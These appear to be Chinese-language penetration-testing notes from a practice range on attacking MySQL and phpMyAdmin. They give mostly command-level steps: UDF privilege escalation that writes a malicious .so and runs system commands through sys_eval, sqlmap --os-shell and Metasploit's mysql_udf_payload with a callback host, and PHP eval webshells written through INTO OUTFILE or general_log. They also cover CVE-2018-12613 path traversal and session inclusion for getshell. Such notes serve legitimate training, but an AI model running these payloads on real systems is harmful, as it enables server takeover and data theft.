# 参考[CVE\-2012\-2122\(mysql渗透\)](https://p7ivesc.github.io/post/CVE-2012-2122%28mysql-shen-tou-%29.html)文档，进行mysql渗透

UDF：User Defined Function，用户自定义函数 

UDF的设计初衷是为了实现功能的多样化和方便用户自定义一些操作函数，但在提升便捷 

性的同时，也带来了命令执行利用的可能。在MySQL中，可以通过创建指向特定库文件 

（Windows中的dll，Linux中的so）的自定义函数，从而实现特定的功能。攻击者利用此特 

点，就可以创建一个能够命令执行的函数。 

利用条件 

• 能够连接到MySQL数据库并执行SQL语句 

• 能够向主机上写入文件 secure\_file\_priv

```SQL
show global variables like "secure_file_priv";
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OGY5ODM4YjgzMWM3MDBmZWE3NWJlMmMyNzZiNjAzNmFfNzNiYWE3MmQ3NjM3MDJmOTI3NDQ0NDlmZThlNWE5NjRfSUQ6NzYyOTU1MjU2OTEwMzkyODI4MV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

kali中自带的UDF提权库文件

```Bash
cd /usr/share/metasploit-framework/data/exploits/mysql
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MWNlOWVhMzg3ZTEzNDkyZGViZWY1ZmY0YTA2NTBkZWFfZWIxMDg2YTQ0ZTBjODFmY2U2ZmM1YTc1Y2I2MDQzZTdfSUQ6NzYyOTU1MzI5MjQ0MzUwMzc5N18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

确认MySQL库文件路径 

```SQL
show variables like '%plugin%';
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Y2E0YTFmMGJmNjAwMWViNGUyYjczM2Q3MDBjZjY3ZjFfMGMyMmIwMTU0MTkyNDM3ZTllNjZlNjMyY2ZjYWE3N2RfSUQ6NzYyOTU1MzU5NDc1NjY4MDkwOV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

# 在MySQL中写入恶意库文件 

```SQL
SELECT unhex("") into dumpfile '/usr/local/mysql/lib/plugin/udf.so';
```

创建恶意函数，指向特定库文件 

```SQL
create function sys_eval returns string SONAME 'udf.so'; 
```

命令执行 

```SQL
select sys_eval('id');
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTQxOGE2M2ZhNjNhMzhkMGMwNDk3M2Y0NmFiMmNmZWFfZjEyZGVkYzdjYjNiNmMzYzE0NGVhZTYzZjMwYWNlYzVfSUQ6NzYyOTU1NDEzNTIzNTEyMDA3M18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

检查创建的函数 

```SQL
select * from mysql.func where name = 'sys_eval';
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OGRiODg4MWI3ODhiMWE0YTA4ZmE4Yzc3MTFhY2IzYThfMjBhZWM2NDFjYjcyYmQxYzNkMTEwZTAwNWQ1OTViMzhfSUQ6NzYyOTU1NDI2NzE2NjkwMzI1N18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

删除函数 

```SQL
drop function sys_eval; 
```

```SQL
select * from mysql.func where name = 'sys_eval';
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmY3NzVjYjhhMDRkZjQ0NjNjNTRkNDA4NGVkZGJjZWVfODg2MzA0MzUzMTM1NTJiZmE1YTE3MDJjN2M2YTUwNmRfSUQ6NzYyOTU1NDQ4NzE3NjY3ODM0N18xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM)

# 使用sqlmap来进行udf提权 

```Bash
sqlmap -d "mysql://root:123456@10.3.4.95:3306/mysql" --os-shell
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZjY0YjI1NTY5MDFmZjc2ZGY5YWIzMjQzMmQwOGYyNTZfMzk0YzYyYzk2YTg0ZDI5YmM5Nzg4NjIwMTIzOWJmYmJfSUQ6NzYyOTU1NTYxNTgxNDc2NTc4OF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

# 使用msf来进行udf提权，但是无回显，需要写入后自行登录执行命令

```Bash
use exploit/multi/mysql/mysql_udf_payload 
msf exploit(multi/mysql/mysql_udf_payload) > set rhosts 10.3.4.95
rhosts => 10.3.4.95
msf exploit(multi/mysql/mysql_udf_payload) > set password 123456
password => 123456
msf exploit(multi/mysql/mysql_udf_payload) > set lhost 192.168.205.48
lhost => 192.168.205.48
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NWQ2N2NlYjdlZDIzMWYyZGRkMTY1N2U2Zjg1ODk0MDBfMjJjMDU0Yzc3NGI0NzRkOWJhNzlkZmEwMTY4MmJjMzFfSUQ6NzYyOTU1Njk5OTkzMjUxMzIzNl8xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDllODM0MDYzMzEyNjU0MmE0Y2ZiMTM4ZWYyNWNmMGJfOGI3NDM2NWRhNzcxMDEzYzdhZWM3ZjdiYzI2MmVmNjVfSUQ6NzYyOTU1NzE1MDUzMjkzMDc4Ml8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTIyMWM5YjNiNGQ0MzFjYzY0Yzg4Y2Y2ZDI4MzdhOTNfMjA0NjdkNWNkMDI0YzQyNDc0Y2JmMjdiZGZmOTBkN2ZfSUQ6NzYyOTU1NzA5OTQ4ODE2OTE0OV8xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Y2Y3M2EwYzRjZjZjMzU0YzJmYzIzNzE2OTNiMmJkY2RfZjQ2M2M2OWQ5Mzg1ODMxM2ZiMjA0MGNiNzU1YmVkZjJfSUQ6NzYyOTU1NzQ0ODI0ODY1ODkwN18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

# PHPMyadmin登录后台后，可以直接执行SQL语句，因此可以尝试直接往web目录下写入webshell

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YmM5ZjIxYTEwNzM5OWRlMjg0ODRlMTI4NWNjZmYxNGVfZDYxMTAyMDkyYjFmNDVhMjgyNjAyZTQ5MjUzMjgyYjdfSUQ6NzYyOTU1ODQzOTIyODUwOTM5Nl8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

```Bash
-- 查看是否有写入权限 
show global variables like '%secure%'; 
-- 写入webshell
select '<?php @eval($_POST[shell]);?>' INTO OUTFILE '/var/www/html/shell.php';
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTQxNmYxMDY2Y2UzNDQzMTdiNDRkNzg3ZjU1MmFhN2RfZjc0OTE4ODYyMzIyMzU0MGQyOWI5YmFhYThjNTM3ZmJfSUQ6NzYyOTU1ODYyMzEyMjk2NzQ4OF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTI1YzQwYzczNTA5NDRkYTUwZTYzYzEyZTEzOGNlYjRfYTRhM2NkM2NhMGE4NzNkMTY5NzU5YTc5OTc5Mzc0OTVfSUQ6NzYyOTU1ODgyMDY5NTc3MjEwN18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

由于是公用靶场，所以已经有shell了，可以直接使用

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MGYxYmYwYTVmMzhlNGE1OTdjMGZkZTFkNjFkNzYyYmRfYmMwNDUzY2QyZmQwNmNlYTdhMDk4YzAwMjM4NDk3YWVfSUQ6NzYyOTU1OTA3MjI5MTU3Mjk2NF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

## 若无法通过SELECT语句写入文件，则可以尝试使用日志文件来写入webshell 

```SQL
-- 查看general日志文件配置情况 
show global variables like "%general%"; 
-- 通过设置general_log选项设置日志写入路径 
set global general_log='on'; 
SET global general_log_file='/var/www/html/cmd.php'; 
-- 在查询中执行语句，写入webshell 
SELECT '<?php eval($_POST["cmd"]);?>';
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ODU4YWUyMzk3ZWVhZjNiNTJjMTZhZTQ1ODViZTY1YTNfZmI2YWQ4NzE2MmRiMzA3ZmYzYmJmYTNmNGQyZDE3ZDlfSUQ6NzYyOTU1OTI4OTAzOTgzNDA1NV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MmFlNjc4Zjg2NWQ3ZTk5MmQ1YTdmMDNlNDkzMDM5Y2VfZTUwZjM1MDdmNzUyMzFjYzAxMmFiMGE1ZmFiNjIzMTJfSUQ6NzYyOTU1OTcwNTc5ODcwODE5Ml8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MmU4Y2FhZjlkNjg5YzliMDAzNzFlNTM2YTkyYjMzOTVfNTE4YWM2NmI4ZmNhYzZmNjA4YjM1Nzk0ZTQ4ZWM5NGNfSUQ6NzYyOTU2MDA3NTI2NjcyMjc3M18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

## phpmyadmin4\.8\.1远程文件包含漏洞（CVE\-2018\-12613） 

phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index\.php中存在一 

处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。 

利用前提： 

能进进入管理页面，通过弱口令等方式

### 1\.访问 http://ip/index\.php?target=db\_sql\.php%253f/\.\./\.\./\.\./\.\./\.\./\.\./\.\./\.\./etc/passwd 页面，验证是否存在漏洞

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MzMwYTU5NDI1ZGMzZTZjMTVlZTBlZDQzOGEyYTQwOTJfNDIzNjIzY2M3OWRjZDI1OTQ5Yzg1ODE0MWI3OTQ4MmJfSUQ6NzYyOTU2MDcxNDMwNjUzODQyN18xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM)

### 2\.执行 sql 语句写入php代码SELECT "\<?php phpinfo\(\);?\>";

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmNiYjBhNGE1MDgwZTZlZWNhZjhkOTYxMjQ3ZDI1ZThfOWFiYTYxYWU4OGJmM2UwYzliYjVhM2YzZTQ3OGQyNTNfSUQ6NzYyOTU2MDkzNjczNDY0MTM0M18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

### 3\.查看自己的 seesionid

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjQ5NTljZmJmNTRlMDAwMTIyNGExMTk5YWZjYmMwZWRfMmYzNTdkODVkMDExMWVjYTcwYWIwZjkxNzczZDNkYjNfSUQ6NzYyOTU2MTE4MjY4NDU4MTA2MF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

### 4\.访问http://ip/index\.php?target=db\_sql\.php%253f/\.\./\.\./\.\./\.\./\.\./\.\./\.\./\.\./tmp/sess\_sessid即包含session文件，即可 getshell

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTZkOGQ4YTc4NDcxOTA1Yzg1ZTU5ODAxODVhY2ZhNTlfYzBhYzMwNjc2YzQ5MzIxZThhYjE2YWQ3OGRiYTU5YjVfSUQ6NzYyOTU2MTk3NDk4MDkzODk0OV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTQ4OGUyODUxM2QwNDhjYmE3ZDFkZWY1NWExZWEzMDNfMzI2OGY3NTExYmJhYTgzZjE1YTljMzRlZDEzZDdhZDdfSUQ6NzYyOTU2MjA5MjI4MDU5NzQ3Ml8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM)
